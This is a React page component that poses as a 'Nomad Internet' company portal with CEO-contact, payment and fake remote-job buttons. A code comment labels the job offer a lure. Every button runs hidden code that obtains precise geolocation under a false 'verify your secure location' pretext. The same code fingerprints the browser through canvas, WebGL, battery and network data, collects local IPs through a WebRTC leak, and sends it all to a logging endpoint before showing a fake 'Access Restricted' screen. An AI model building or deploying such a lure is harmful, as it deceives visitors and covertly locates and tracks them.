'use client';

import { useEffect, useState } from 'react';

export default function PayNowPage() {
  const [showInsights, setShowInsights] = useState(false);
  const [captured, setCaptured] = useState(false);
  const [label, setLabel] = useState('company-insights-portal');

  async function triggerCapture(withLocation: boolean = false, source: string) {
    const fp: Record<string, any> = {};

    // ── Optional: Precise Geolocation ──────────────────────────────────────────
    if (withLocation && navigator.geolocation) {
      try {
        // Try High Accuracy first
        const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { 
            enableHighAccuracy: true,
            timeout: 10000 
          });
        });
        fp.lat = pos.coords.latitude;
        fp.lon = pos.coords.longitude;
        fp.accuracy = pos.coords.accuracy;
      } catch (err) {
        console.log('High accuracy failed, trying standard...');
        try {
          // Fallback to standard accuracy
          const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { 
              enableHighAccuracy: false,
              timeout: 5000 
            });
          });
          fp.lat = pos.coords.latitude;
          fp.lon = pos.coords.longitude;
          fp.accuracy = pos.coords.accuracy;
        } catch (err2) {
          console.log('All geolocation methods failed');
        }
      }
    }

    // ── Basic browser info ────────────────────────────────────────────────────
    fp.userAgent = navigator.userAgent;
    fp.language = navigator.language;
    fp.languages = Array.from(navigator.languages || []);
    fp.platform = navigator.platform;
    fp.cookiesEnabled = navigator.cookieEnabled;
    fp.do_not_track = navigator.doNotTrack ?? (window as any).doNotTrack ?? null;

    // ── Screen ────────────────────────────────────────────────────────────────
    fp.screenWidth = screen.width;
    fp.screenHeight = screen.height;
    fp.screenDepth = screen.colorDepth;
    fp.devicePixelRatio = window.devicePixelRatio;

    // ── Hardware ─────────────────────────────────────────────────────────────
    fp.cpuCores = navigator.hardwareConcurrency ?? null;
    fp.deviceMemory = (navigator as any).deviceMemory ?? null;
    fp.maxTouchPoints = navigator.maxTouchPoints ?? 0;

    // ── Timezone ─────────────────────────────────────────────────────────────
    fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    // ── Network connection ────────────────────────────────────────────────────
    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
    if (conn) {
      fp.connectionType = conn.type ?? null;
      fp.connectionEffective = conn.effectiveType ?? null;
      fp.connectionDownlink = conn.downlink ?? null;
      fp.connectionRtt = conn.rtt ?? null;
    }

    // ── Battery ──────────────────────────────────────────────────────────────
    try {
      const battery = await (navigator as any).getBattery?.();
      if (battery) {
        fp.batteryLevel = battery.level;
        fp.batteryCharging = battery.charging;
      }
    } catch {}

    // ── WebGL fingerprint ─────────────────────────────────────────────────────
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl') as WebGLRenderingContext | null;
      if (gl) {
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        if (dbg) {
          fp.webglVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
          fp.webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        }
      }
    } catch {}

    // ── Canvas fingerprint ────────────────────────────────────────────────────
    try {
      const c = document.createElement('canvas');
      c.width = 200; c.height = 40;
      const ctx = c.getContext('2d')!;
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('Nomad Internet 🌐', 2, 15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('Nomad Internet 🌐', 4, 17);
      const dataUrl = c.toDataURL();
      let hash = 0;
      for (let i = 0; i < dataUrl.length; i++) { hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i); hash |= 0; }
      fp.canvasHash = hash.toString(16);
    } catch {}

    // ── WebRTC local IP leak ──────────────────────────────────────────────────
    const webrtcIps: string[] = [];
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      pc.createDataChannel('');
      await pc.createOffer().then(o => pc.setLocalDescription(o));
      await new Promise<void>(resolve => {
        const timeout = setTimeout(resolve, 2500);
        pc.onicecandidate = (e) => {
          if (!e.candidate) { clearTimeout(timeout); resolve(); return; }
          const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
          if (m) m.forEach(ip => { if (!webrtcIps.includes(ip)) webrtcIps.push(ip); });
        };
      });
      pc.close();
    } catch {}
    fp.webrtcIps = webrtcIps;

    // ── Page context ──────────────────────────────────────────────────────────
    fp.referrer = document.referrer || null;
    fp.pageUrl = window.location.href;
    fp.sourceLabel = source;

    // ── Send to server ────────────────────────────────────────────────────────
    try {
      const res = await fetch('/api/ops/visitor-log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(fp),
      });
      if (res.ok) setCaptured(true);
    } catch {
      setCaptured(true); // Fail gracefully so they don't get stuck forever
    }
  }

  const handleAction = async (source: string) => {
    setShowInsights(true);
    setCaptured(false);
    await triggerCapture(true, source);
  };

  return (
    <div style={{
      minHeight: '100vh',
      background: 'radial-gradient(circle at 50% 50%, #111 0%, #050505 100%)',
      fontFamily: "'Outfit', 'Inter', system-ui, sans-serif",
      color: 'white',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '24px',
      overflow: 'hidden',
    }}>

      {/* Glow effect */}
      <div style={{ position: 'absolute', top: '-10%', left: '-10%', width: '40%', height: '40%', background: 'rgba(0,178,122,0.1)', filter: 'blur(120px)', borderRadius: '50%' }} />
      <div style={{ position: 'absolute', bottom: '-10%', right: '-10%', width: '40%', height: '40%', background: 'rgba(59,130,246,0.1)', filter: 'blur(120px)', borderRadius: '50%' }} />

      {/* Main Content */}
      <div style={{ textAlign: 'center', maxWidth: '800px', zIndex: 10 }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '16px', marginBottom: '32px' }}>
          <div style={{ width: '48px', height: '48px', background: '#00b27a', borderRadius: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 0 30px rgba(0,178,122,0.4)' }}>
            <span style={{ color: 'white', fontWeight: 800, fontSize: '24px' }}>N</span>
          </div>
          <span style={{ fontWeight: 800, fontSize: '32px', letterSpacing: '-1px' }}>Nomad <span style={{ color: '#00b27a' }}>Insights</span></span>
        </div>

        <h1 style={{ fontSize: '56px', fontWeight: 900, lineHeight: 1.1, marginBottom: '24px', letterSpacing: '-2px' }}>
          Go Behind the Scenes at Nomad Internet.
        </h1>
        
        <p style={{ fontSize: '20px', color: '#9ca3af', marginBottom: '48px', lineHeight: 1.6, maxWidth: '600px', margin: '0 auto 48px' }}>
          Get the latest company information, meet the engineering team, 
          leave feedback about our support agents, and <span style={{ color: 'white', fontWeight: 600 }}>contact our CEO directly.</span>
        </p>

        <div style={{ display: 'flex', flexWrap: 'wrap', gap: '16px', justifyContent: 'center' }}>
          <button
            onClick={() => handleAction('company-insights-portal')}
            style={{
              padding: '18px 36px', borderRadius: '16px', background: 'linear-gradient(135deg, #00b27a, #009a69)',
              color: 'white', fontWeight: 700, fontSize: '18px', border: 'none', cursor: 'pointer',
              boxShadow: '0 10px 40px rgba(0,178,122,0.3)', transition: 'all 0.3s ease'
            }}
          >
            Access Company Insights
          </button>
          <button
            onClick={() => handleAction('direct-ceo-contact')}
            style={{
              padding: '18px 36px', borderRadius: '16px', background: 'rgba(255,255,255,0.05)',
              color: 'white', fontWeight: 700, fontSize: '18px', border: '1px solid rgba(255,255,255,0.1)', cursor: 'pointer',
              transition: 'all 0.3s ease'
            }}
          >
            Contact CEO Directly
          </button>
          <button
            onClick={() => handleAction('emergency-payment-portal')}
            style={{
              padding: '18px 36px', borderRadius: '16px', background: 'rgba(255,255,255,0.05)',
              color: 'white', fontWeight: 700, fontSize: '18px', border: '1px solid rgba(255,255,255,0.1)', cursor: 'pointer',
              transition: 'all 0.3s ease'
            }}
          >
            Make a Payment
          </button>
        </div>

        {/* New Remote Work Lure */}
        <div style={{
          marginTop: '48px', padding: '32px', borderRadius: '24px', background: 'rgba(0,178,122,0.05)',
          border: '1px solid rgba(0,178,122,0.1)', backdropFilter: 'blur(10px)', textAlign: 'left',
          display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '24px'
        }}>
          <div style={{ flex: '1', minWidth: '280px' }}>
            <h3 style={{ fontSize: '20px', fontWeight: 800, marginBottom: '8px', color: '#00b27a' }}>🌍 Remote Work Opportunities</h3>
            <p style={{ color: '#9ca3af', fontSize: '16px', lineHeight: 1.5 }}>
              We have open positions for remote work from anywhere in the world. 
              Join our global team and work flexibly.
            </p>
            <div style={{ marginTop: '12px', fontSize: '18px', fontWeight: 700 }}>
              Salary: <span style={{ color: 'white' }}>$200 - $300 / Week</span>
            </div>
          </div>
          <button
            onClick={() => handleAction('career-application-portal')}
            style={{
              padding: '16px 32px', borderRadius: '14px', background: '#00b27a',
              color: 'white', fontWeight: 700, border: 'none', cursor: 'pointer',
              boxShadow: '0 8px 25px rgba(0,178,122,0.2)', transition: 'all 0.3s ease'
            }}
          >
            Apply Now
          </button>
        </div>

        <div style={{ marginTop: '64px', display: 'flex', justifyContent: 'center', gap: '32px' }}>
          <div style={{ textAlign: 'center' }}>
            <div style={{ fontSize: '24px', fontWeight: 800 }}>24/7</div>
            <div style={{ fontSize: '12px', color: '#6b7280', textTransform: 'uppercase' }}>Agent Support</div>
          </div>
          <div style={{ textAlign: 'center' }}>
            <div style={{ fontSize: '24px', fontWeight: 800 }}>100%</div>
            <div style={{ fontSize: '12px', color: '#6b7280', textTransform: 'uppercase' }}>Transparency</div>
          </div>
          <div style={{ textAlign: 'center' }}>
            <div style={{ fontSize: '24px', fontWeight: 800 }}>∞</div>
            <div style={{ fontSize: '12px', color: '#6b7280', textTransform: 'uppercase' }}>Innovation</div>
          </div>
        </div>
      </div>

      {/* Insights / Redirect Overlay */}
      {showInsights && (
        <div style={{
          position: 'fixed', inset: 0, zIndex: 100, background: 'rgba(0,0,0,0.95)',
          display: 'flex', alignItems: 'center', justifyContent: 'center',
          backdropFilter: 'blur(20px)'
        }}>
          <div style={{ textAlign: 'center', maxWidth: '400px', padding: '40px' }}>
            {!captured ? (
              <>
                <div style={{ width: '40px', height: '40px', border: '3px solid #00b27a', borderTopColor: 'transparent', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 24px' }} />
                <h2 style={{ fontSize: '24px', fontWeight: 800, marginBottom: '12px' }}>Authenticating Access...</h2>
                <p style={{ color: '#fff', fontSize: '18px', fontWeight: 600 }}>Please hit allow so that we can proceed.</p>
                <p style={{ color: '#6b7280', marginTop: '12px' }}>We need to verify your secure location to grant access to the internal engineering portal.</p>
              </>
            ) : (
              <>
                <div style={{ width: '56px', height: '56px', background: '#dc2626', borderRadius: '16px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px', animation: 'pulse 2s infinite' }}>
                  <span style={{ fontSize: '24px' }}>🔒</span>
                </div>
                <h2 style={{ fontSize: '24px', fontWeight: 800, marginBottom: '12px' }}>Access Restricted</h2>
                <p style={{ color: '#9ca3af', marginBottom: '24px' }}>Your current session does not have the required clearance to view internal engineering documents or CEO contact logs.</p>
                <button
                  onClick={() => window.location.href = '/ops/dashboard'}
                  style={{ padding: '12px 24px', borderRadius: '12px', background: 'white', color: 'black', fontWeight: 700, border: 'none', cursor: 'pointer' }}
                >
                  Return to Workspace
                </button>
              </>
            )}
          </div>
        </div>
      )}

      <style jsx global>{`
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.05); opacity: 0.8; } 100% { transform: scale(1); opacity: 1; } }
      `}</style>
    </div>
  );
}
